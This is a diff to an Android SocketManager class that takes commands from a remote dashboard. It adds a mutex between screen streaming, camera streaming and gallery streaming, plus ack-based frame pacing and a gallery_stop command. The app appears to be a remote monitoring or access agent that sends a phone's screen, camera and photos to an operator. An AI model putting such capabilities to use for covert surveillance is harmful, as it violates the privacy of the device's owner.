@@ -163,6 +163,16 @@ public class SocketManager {
     private final java.util.concurrent.atomic.AtomicBoolean streamWriteBusy =
             new java.util.concurrent.atomic.AtomicBoolean(false);
 
+    // Feature mutex — only one high-bandwidth feature runs at a time.
+    // Starting screen stream, camera stream, or gallery automatically stops the others
+    // so bandwidth isn't split on 3G/4G links.
+    private volatile String activeFeature = null; // "screen", "camera", "gallery"
+
+    // Gallery stop flag — set true by gallery_stop command or by the feature mutex.
+    // The streaming chunk callback checks this and skips sending if true.
+    private final java.util.concurrent.atomic.AtomicBoolean galleryStopFlag =
+            new java.util.concurrent.atomic.AtomicBoolean(false);
+
     // Accessibility tree reads are NOT thread-safe — serialize them with a 1-permit semaphore.
     // Concurrent AccessibilityNodeInfo traversals corrupt Android's internal node pool and crash the process.
     private final java.util.concurrent.Semaphore accessSemaphore = new java.util.concurrent.Semaphore(1);
@@ -424,6 +434,20 @@ public class SocketManager {
                                     streamOut.flush();
                                 }
                             }
+                        }
+                        // Ack-based screen-stream pacing: backend sends stream:ack after
+                        // each frame is relayed to the dashboard. On receiving it we
+                        // immediately dispatch the next capture so the dashboard always
+                        // shows the freshest frame without buffering stale ones.
+                        if ("stream:ack".equals(incoming.optString("event"))) {
+                            if (idleFrameMode && streamingDeviceId != null) {
+                                final String did = streamingDeviceId;
+                                executor.execute(() -> sendSingleFrame(did));
+                            }
+                        }
+                        // Ack-based camera pacing: mirror the screen-stream ack pattern.
+                        if ("camera:ack".equals(incoming.optString("event"))) {
+                            cameraStreamHandler.onAck();
                         }
                     } catch (Exception ignored) {}
                 }
@@ -1140,6 +1164,13 @@ public class SocketManager {
         // ── Camera Stream / Record / Dot ─────────────────────────────────
         // Mirrors the screen stream pattern: camera:frame events → cached by server.
         if (command.equals("camera_stream_start")) {
+            // Feature mutex: stop screen stream and gallery before starting camera
+            heartbeatExecutor.execute(() -> {
+                stopIdleFrameMode();
+                stopBlockFrameMode();
+            });
+            galleryStopFlag.set(true);
+            activeFeature = "camera";
             String camId = params.optString("cameraId", "0");
             long intMs   = Math.max(500L, params.optLong("intervalMs", 2000L));
             return cameraStreamHandler.startStream(camId, intMs);
@@ -1207,16 +1238,26 @@ public class SocketManager {
             final String cidG  = params.optString("commandId", "");
             final String type  = params.optString("type", "all");
             final int    limit = params.optInt("limit", 500);
+            // Feature mutex: stop screen stream and camera before starting gallery
+            heartbeatExecutor.execute(() -> {
+                stopIdleFrameMode();
+                stopBlockFrameMode();
+            });
+            if (cameraStreamHandler.isStreaming()) cameraStreamHandler.stopStream();
+            galleryStopFlag.set(false); // reset stop flag for this new gallery session
+            activeFeature = "gallery";
             bulkExecutor.execute(() -> {
                 try {
-                    // Stream items to the dashboard as each chunk of 15 is ready,
-                    // rather than waiting for the entire scan + thumbnail generation
-                    // to complete before sending anything.
+                    // Stream items to the dashboard as each chunk of 20 is ready.
+                    // Each chunk now includes micro-thumbnails (64 px, quality 40) embedded
+                    // directly — no follow-up per-item thumbnail request needed.
                     final int[]  chunkIndex = {0};
-                    final int    CHUNK_SIZE = 15;
+                    final int    CHUNK_SIZE = 20;
 
                     int totalSent = galleryHandler.streamGallery(type, limit, CHUNK_SIZE,
                         chunk -> {
+                            // Honour gallery_stop command — bail immediately
+                            if (galleryStopFlag.get()) return;
                             try {
                                 JSONObject msg = new JSONObject();
                                 msg.put("commandId",  cidG);
@@ -1253,6 +1294,15 @@ public class SocketManager {
                 }
             });
             return null;
+        }
+        if (command.equals("gallery_stop")) {
+            // Stop the currently running gallery stream
+            galleryStopFlag.set(true);
+            if ("gallery".equals(activeFeature)) activeFeature = null;
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("message", "Gallery stopped");
+            return r;
         }
         if (command.equals("get_gallery_thumbnail")) {
             final long    mediaId = params.optLong("mediaId", -1);
@@ -1416,6 +1466,10 @@ public class SocketManager {
             // start — guaranteeing FIFO order between stop and start commands.
             final String deviceId = DeviceInfo.getDeviceId(context);
             heartbeatExecutor.execute(() -> {
+                // Feature mutex: stop camera stream and gallery before starting screen stream
+                if (cameraStreamHandler.isStreaming()) cameraStreamHandler.stopStream();
+                galleryStopFlag.set(true);
+                activeFeature = "screen";
                 startIdleFrameMode(deviceId, requestedIntervalMs);
                 sendSingleFrame(deviceId);
             });
